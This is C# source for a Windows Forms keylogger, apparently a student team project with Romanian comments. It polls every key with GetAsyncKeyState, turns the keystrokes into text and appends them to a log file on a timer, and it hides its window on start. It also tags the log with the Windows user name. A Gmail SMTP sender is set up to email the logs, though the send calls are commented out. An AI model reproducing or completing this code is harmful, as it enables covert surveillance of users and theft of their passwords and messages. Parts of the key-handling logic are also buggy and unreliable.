﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
//
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        //TODO
        // trebuie modificate variabilele sa intelegem ce sunt cu ele la fel si pe interfata.
        // trimiterea email-ului ar trebui sa se faca doar la o apasare de buton pe buton de interfata sau daca e invizibila interfata, la inceput cand se da init se poate selecta timpul la care sa se trimita un email
        // si asa setati timer_tick period la timpul selectat de client. cred ca la 1-2 minute pentru a putea fi usor testat.
        // timerul de scriere a fisierului cred ca trebuie sa ramana la fel.
        private Proxy _proxy;
        private MailSender _mailSender;
        private KeyLogger _keyLogger;
        // _keyLogger va fi tot o clasa si metodele sale for fi utilizate prin acest atribut. KeyLogger.Start()...KeyLogger.Init() etc cum ganditi voi.
        // am aplicat sablon proxy ca sa fie unul. nu stiu daca e foarte util dar l-am folosit sa fie un sablon sa respectam cerinta. Ma gandesc la un singleton mai tarziu.
        public Form1()
        {
            InitializeComponent();
            //comentariu

            _proxy = new Proxy();
            _mailSender = new MailSender("smtp.gmail.com", 587, "YOUR-EMAIL-1@gmail.com");// email doar de tip gmail.
            _keyLogger = new KeyLogger();
        }
        string data = "";
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        StringBuilder keyBuffer;



        void CreateLog(string file)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file, true);//I used true to append log to file

                sw.Write(keyBuffer.ToString());
                sw.Write(data.ToString());
                sw.Close();
                keyBuffer.Clear(); // reset buffer
            }
            catch
            {
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Opacity = 0;
            key.Enabled = true;
            log.Enabled = true;
            notifyIcon1.ShowBalloonTip(5000);
            button2.Enabled = true;
            button1.Enabled = false;
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Opacity = 0;
        }
        string msg = "";
        bool capslock;
        //Metoda Key_tick trebuie sa ramane aici, apartine de interfata(trebuie modificat sa mearga cu apelurile din KeyLogger class. Adica codul ce tine de logger sa fie in clasa Logger aici sa se faca doar actualizari
        // Sa fie fiecare modul cu specificul lui.
        private void key_Tick(object sender, EventArgs e)
        {
            capslock = Console.CapsLock;
            // noi nu ar trebui sa punem textul pe interfata atata timp cat va fi invizibila dupa ce dam start.
            // ca sa mearga treaba aici ca idee sa fie frumos ma gandesc sa faceti o metoda in KeyLogger in care sa se faca switchul asta urias iar metoda sa returneze string-ul care trebuie adaugat la mesaj aici.
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
            {
                if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                {
                    msg = Enum.GetName(typeof(Keys), i).ToString();
                    if (capslock == true)
                    {
                        msg = msg.ToUpper();
                    }
                    else
                        msg=msg.ToLower();
                    switch (msg)
                    {
                        case "space":case "SPACE":
                            msg = " ";
                            break;
                        case "capslock":
                        case "CAPSLOCK":
                            msg = " ";
                            break;

                      //  shiftkeylshiftkey
                        case "enter":case "ENTER":
                            msg=(Environment.NewLine);
                            break;
                           
                        case "LBUTTON": case "lbutton":
                            msg = "";
                            break;
                        case "OemPeriod":case "OEMPERIOD":case "oemperiod":
                            msg=".";
                            break;

                        case "LMenu":case "lemnu":case "LMENU":
                            msg="ALT ";
                            break;
                        case "Back":
                            msg = " ";
                            break;

                        case "Oem7":
                            msg="'";
                            break;
                        case "down":
                            msg = " D ";
                            break;
                        case "up":
                            msg = " U ";
                            break;
                        case "right":
                            msg = " R ";
                            break;
                        case "left":
                            msg = " L ";
                            break;
                        case "back":
                            msg = " B ";
                            break;
                        case "Oemcomma":
                            msg=",";
                            break;
                        case "Capital":
                            msg="CAPITAL ";
                            break;
                        case "Tab":
                            msg="TAB ";
                            break;
                        case "OemQuestion":
                            msg="?";
                            break;
                        case "Oem1":
                            msg=";";
                            break;
                        case "Oem5":
                            msg="\\";
                            break;
                        case "Oem6":
                            msg="]";
                            break;
                        case "OemOpenBrackets":
                            msg="[";
                            break;
                        case "OemMinus":
                            msg="-";
                            break;
                        case "Oemplus":
                            msg="+";
                            break;
                        /*case Keys.Down:
                            sw.Write("DownArrow-");
                            break;
                        case Keys.Left:
                            sw.Write("Left Arrow-");
                            break;
                        case Keys.Right:
                            sw.Write("Righr Arrow-");
                            break;
                        case Keys.Up:
                            sw.Write("Up Arrow-");
                            break;*/
                        case "D0":
                        case "d0":
                            msg="0";
                            break;
                        case "D1":
                        case "d1":
                            msg="1";
                            break;
                        case "D2":
                        case "d2":
                            msg="2";
                            break;
                        case "D3":
                        case "d3":
                            msg="3";
                            break;
                        case "D4":
                        case "d4":
                            msg="4";
                            break;
                        case "D5":
                        case "d5":
                            msg="5";
                            break;
                        case "D6":
                        case "d6":
                            msg="6";
                            break;
                        case "D7":
                        case "d7":
                            msg="7";
                            break;
                        case "D8":
                        case "d8":
                            msg="8";
                            break;
                        case "D9":
                        case "d9":
                            msg="9";
                            break;
                        case "OemPipe":
                            msg = "|";
                            break;
                        case "rshiftkey":
                        case "RShiftKey":
                        case "RSHIFTKEY":
                            msg = "";
                            break;
                        case "LSHIFTKEY":
                       case "Lshiftkey":
                       case "lshiftkey":
                            msg = "";
                            ///test comm for commits
                            break;

                       case "LCONTROLKEY":
                       case "lcontrolkey":
                            msg = "";
                            break;
                       case "RCONTROLKEY":
                       case "rcontrolkey":
                            msg = "";
                            break;

                            case "OemSemicolon":
                            msg=";";
                            break;
                        case "DELETE":case "delete":
                            msg = "";
                            break;
                        //case "DELETE":
                        //case "delete":
                          //  msg = "";
                            //break;
                    }
                    
                    if (msg.Contains("control") || msg.Contains("CONTROL")) try { msg = msg.Substring("CONTROL".Length, msg.Length); ctrl = 2; }
                        catch { msg = ""; ctrl = 2; }
                    if (msg.Contains("shift") || msg.Contains("SHIFT")) try { msg = msg.Substring("SHIFT".Length, msg.Length); shift = 3; }
                        catch { msg = ""; shift = 3; }

                    if (msg.Equals("delete") || msg.Equals("DELETE")) del = 2;
                    if(msg.Equals("back")||msg.Equals("BACK"))back=3;

                    if (shift == 1)
                    {
                        try
                        {
                            a = Convert.ToChar(msg);
                            shift = 0;
                            
                        }catch{}

                        if (capslock == true)
                        {
                            sp = Convert.ToInt32(a) + 32;
                            try { ab = Convert.ToChar(sp); }
                            catch { MessageBox.Show(sp.ToString()); }
                            msg = ab.ToString(); shift = 0;
                        }
                        else
                        {   
                           msg = msg.ToString().ToUpper();
                           sp = Convert.ToInt32(a) - 32;
                           try { ab = Convert.ToChar(sp); }
                           catch { MessageBox.Show(sp.ToString()); }
                           msg = ab.ToString(); shift = 0;
                        }
                        label1.Text = shift.ToString() + "  " + msg.ToString();
                        richTextBox1.Text += msg;
                        
                        shift = 0;
                    }
                    else
                    {
                     if(shift>= 2)shift--;
                        keyBuffer.Append(msg);
                        label1.Text = shift.ToString() + "  " + msg.ToString();
                        richTextBox1.Text += msg;
                    }
                }
            }		
        }
        int ctrl, shift, del,back = 0; int sp; string msg2; char a,ab;
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Opacity = 1;
            key.Enabled = true;
            log.Enabled = true;
            notifyIcon1.ShowBalloonTip(5000);
            button2.Enabled = true;
            button1.Enabled = false;
            
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            richTextBox1.Text += userName + "     :    ";
            keyBuffer = new StringBuilder();

        }

        
        private void log_Tick(object sender, EventArgs e)
        {
            CreateLog(@"D:\logfilebest.txt");
        }
        private void button2_Click(object sender, EventArgs e)
        {
            key.Enabled = false;
            log.Enabled = false;
            button1.Enabled = true;
            button2.Enabled = false;            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
            string path = "test";
           //_mailSender.SendMail(_proxy.GetDocument(path));
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
            string path = "test";
            //_mailSender.SendMail(_proxy.GetDocument(path));
        }
    }
}
